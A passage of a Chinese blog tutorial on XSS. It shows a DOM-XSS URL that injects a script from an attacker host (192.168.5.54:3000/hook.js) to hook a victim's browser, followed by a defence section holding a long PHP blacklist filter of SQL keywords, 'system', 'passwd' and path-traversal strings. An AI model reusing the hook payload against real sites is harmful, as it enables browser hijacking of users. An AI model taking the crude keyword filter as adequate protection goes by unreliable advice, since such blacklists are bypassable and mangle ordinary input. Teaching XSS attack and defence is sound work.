+<p>如： <a href="http://127.0.0.1/domxss.html?name=" target="_blank" rel="noopener">http://127.0.0.1/domxss.html?name=</a><script src="http://192.168.5.54:3000/hook.js"></script></p>
+<p>用户点击以后便直接上线：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1578540669070.png" alt="1578540669070"></p>
+<p>然后就可以做很多事件：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1578540698882.png" alt="1578540698882"></p>
+<h3 id="4-如何防御XSS"><a href="#4-如何防御XSS" class="headerlink" title="4.如何防御XSS"></a>4.如何防御XSS</h3><p>xss的防御主要还是集中在代码层，需要过滤非法字符。需要对输入内容进行过滤，输出内容进行编码。</p>
+<p>针对php可以用如下代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($str)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    $str = htmlspecialchars($str);</span><br><span class="line">    $str = str_replace( <span class="string">'/'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'"'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'('</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">')'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'CR'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'ASCII'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'ASCII 0x0d'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'LF'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'ASCII 0x0a'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">','</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'%'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">';'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'eval'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'open'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'sysopen'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'system'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'$'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">"'"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">"'"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'ASCII 0x08'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'"'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'"'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">""</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"&amp;gt"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"&amp;lt"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;SCRIPT&gt;"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;/SCRIPT&gt;"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;script&gt;"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;/script&gt;"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"select"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"join"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"union"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"where"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"insert"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"delete"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"update"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"like"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"drop"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"DROP"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"create"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"modify"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"rename"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"alter"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"cas"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&amp;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">" "</span>,chr(<span class="number">32</span>),$str);</span><br><span class="line">    $str = str_replace(<span class="string">" "</span>,chr(<span class="number">9</span>),$str);</span><br><span class="line">    $str = str_replace(<span class="string">"    "</span>,chr(<span class="number">9</span>),$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&amp;"</span>,chr(<span class="number">34</span>),$str);</span><br><span class="line">    $str = str_replace(<span class="string">"'"</span>,chr(<span class="number">39</span>),$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;br /&gt;"</span>,chr(<span class="number">13</span>),$str);</span><br><span class="line">    $str = str_replace(<span class="string">"''"</span>,<span class="string">"'"</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"css"</span>,<span class="string">"'"</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"CSS"</span>,<span class="string">"'"</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;!--"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"convert"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"md5"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"passwd"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"password"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"../"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"./"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"Array"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"or 1='1'"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">";set|set&amp;set;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"`set|set&amp;set`"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"--"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"OR"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">'"'</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"*"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"-"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"+"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"/"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"="</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"'/"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"-- "</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">" -- "</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">" --"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"("</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">")"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&#123;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&#125;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"-1"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"1"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"."</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"response"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"write"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"|"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"`"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">";"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"etc"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"root"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"//"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"!="</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"$"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&amp;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&amp;&amp;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"=="</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"#"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"@"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"mailto:"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"CHAR"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"char"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将非法字符都过滤掉可以一定程度上防止XSS也可以防止SQL注入。</p>
 
           
         
